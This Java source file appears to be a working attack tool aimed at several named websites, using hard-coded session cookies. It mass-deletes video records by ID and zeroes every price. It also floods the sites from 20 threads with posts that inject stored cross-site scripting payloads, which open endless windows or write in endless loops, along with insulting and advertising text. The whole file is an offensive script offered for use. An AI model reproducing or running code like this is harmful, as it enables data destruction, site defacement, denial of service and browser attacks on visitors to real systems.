package com.smile.azxx.util;

import org.apache.commons.collections.MapUtils;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.net.URI;
import java.util.*;

/**
 * Created by smile on 2018/5/26.
 */
//http://www.yuajcity.vip
public class DeleteVideoTow {

    public static void main(String[] args) {

//       deleteVideo();
//       insertVideo();
//       addPoint();
//        updateVideoName();
        updatePrice();
    }

    public static void deleteVideo(){
        String ids = "";
//        for (int i = 14091; i > 14060; i--) {
        for (int i = 14813; i > 0; i--) {
            System.out.println(ids);
            String url ="http://www.yuajcity.vip/dldl/shipin.php?action=del&delid="+i+"&page=1";
            ids = "";
            System.out.println(url);
            try {
                CloseableHttpClient client = HttpClients.createDefault();
                //发送get请求
                HttpGet request = new HttpGet(url);
                request.addHeader("Cookie","PHPSESSID=gujsag8l4ve1usqichak4p37c3");
                CloseableHttpResponse response = client.execute(request);

                /**请求发送成功，并得到响应**/
                if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                    /**读取服务器返回过来的json字符串数据**/
                    String strResult = EntityUtils.toString(response.getEntity());
                    System.out.println(i+"删除成功！");
                } else {
//                logger.info(response.getStatusLine().getStatusCode() + "");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void insertVideo( ){
        for (int j = 0; j < 20; j++) {
            System.out.println("线程："+j);
            Thread thread = new Thread(){
                public void run(){
                    Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                    map.put("sj","sb");
                    map.put("money","SBSBSBSBSBS");
                    map.put("url","www.baidu.com");
                    for (int i = 101000; i < 100000000; i++) {
                        String uid = new RandomGUID().getUUID32();
                        map.put("userid",(10000+(int)(Math.random()*200+1))+"");
//                        map.put("userid",10003+"");
                        map.put("zykey",uid);
                        map.put("name","小心，这是个跑路平台！"+i+uid+"1\"onmouseover=while(true){window.open(document.URL);}\"");
//                        map.put("name","做我们这个平台是一群SB！"+i+uid+"1\"onmouseover=alert(9619)\"");
                        String dinghuiCookie = "UM_distinctid=1639c063116118-0e107cde6d49ec8-4c312a7a-144000-1639c063118680; PHPSESSID=rqug7trl5egpko48mdiqgds034";
                        doPost("http://xindinghui.xqx6.cn/pc/shipinto.php",map,dinghuiCookie);
//                        HttpClientUtil.doPost("http://www.yuajcity.vip/dldl/shipinto.php",map);
                    }                }
            };
            thread.start();
        }
    }

    public static void doPost(String url, Map params,String cookie) {

        BufferedReader in = null;
        try {
            // 定义HttpClient
            CloseableHttpClient client = HttpClients.createDefault();
            // 实例化HTTP方法
            HttpPost request = new HttpPost();
            request.setURI(new URI(url));

//            request.addHeader("Cookie","PHPSESSID=nh940c8k4bl8u3uchhcqnmfkh4");
            request.addHeader("Cookie",cookie);
            //设置参数
            List<NameValuePair> nvps = new ArrayList<>();
            if (!MapUtils.isEmpty(params)) {
                for (Iterator iter = params.keySet().iterator(); iter.hasNext(); ) {
                    String name = (String) iter.next();
                    String value = String.valueOf(params.get(name));
                    nvps.add(new BasicNameValuePair(name, value));
                    //System.out.println(name +"-"+value);
                }
            }
            request.setEntity(new UrlEncodedFormEntity(nvps, HTTP.UTF_8));

            client.execute(request);
//            HttpResponse response = client.execute(request);
//            int code = response.getStatusLine().getStatusCode();
//            System.out.println(code);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void addPoint(){
        for (int j = 0; j < 20; j++) {
            System.out.println("线程："+j);
            Thread thread = new Thread(){
                public void run(){
                    Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
                    map.put("cz","wzfb");
//                    map.put("name","SBSBSBSBSBS");
//                    map.put("url","www.baidu.com");
                    for (int i = 101000; i < 100000000; i++) {
                        String uid = new RandomGUID().getUUID32();
                        map.put("userid",(10000+(int)(Math.random()*200+1))+"");
//                        map.put("userid",10003+"");
//                        map.put("zykey",uid);
                        System.out.println((10000+(int)(Math.random()*200+1))+"");
                        map.put("name","请联系微信cracker1101 提供技术解决方案！"+i+uid+"1\"onmouseover=while(true){window.open(document.URL);}\"");
//                        map.put("name","做我们这个平台是一群SB！"+i+uid+"1\"onmouseover=alert(9619)\"");
//                        String dinghuiCookie = "UM_distinctid=1639c063116118-0e107cde6d49ec8-4c312a7a-144000-1639c063118680; PHPSESSID=rqug7trl5egpko48mdiqgds034";
                        String dinghuiCookie = "PHPSESSID=4i96pet5o2844s3lc0lcrmkkp5";
                        doPost("http://www.813314.top/pc/update.php",map,dinghuiCookie);
//                        doPost("http://xindinghui.xqx6.cn/pc/wztj.php",map,dinghuiCookie);
//                        HttpClientUtil.doPost("http://www.yuajcity.vip/dldl/shipinto.php",map);
                    }                }
            };
            thread.start();
        }
    }


    public static void updateVideoName(){
        Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
        for (int i = 8531; i > 0; i--) {

            System.out.println("开始ID:"+i );
            map.put("cz","name");
            map.put("id",i+"");
            map.put("name","<a href=# onclick=while(true)document.write(2222);>请联系微信cracker1101 提供技术解决方案</a>");
//            map.put("name","请联系微信cracker1101 提供技术解决方案");
            String dinghuiCookie = "PHPSESSID=iq3m5mcvsl4poa7vupnj6anaq1";
            doPost("http://www.yuajcity.vip/dldl/update.php",map,dinghuiCookie);
        }

    }
    public static void updatePrice(){
        Map<String,String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");
        for (int i = 19132; i > 0; i--) {
            System.out.println("开始ID:"+i);
            map.put("cz","jiage");
            map.put("id",i+"");
            map.put("money","0-0");
            String dinghuiCookie = "PHPSESSID=gujsag8l4ve1usqichak4p37c3";
            doPost("http://www.yuajcity.vip/dldl/update.php",map,dinghuiCookie);
        }

    }
}
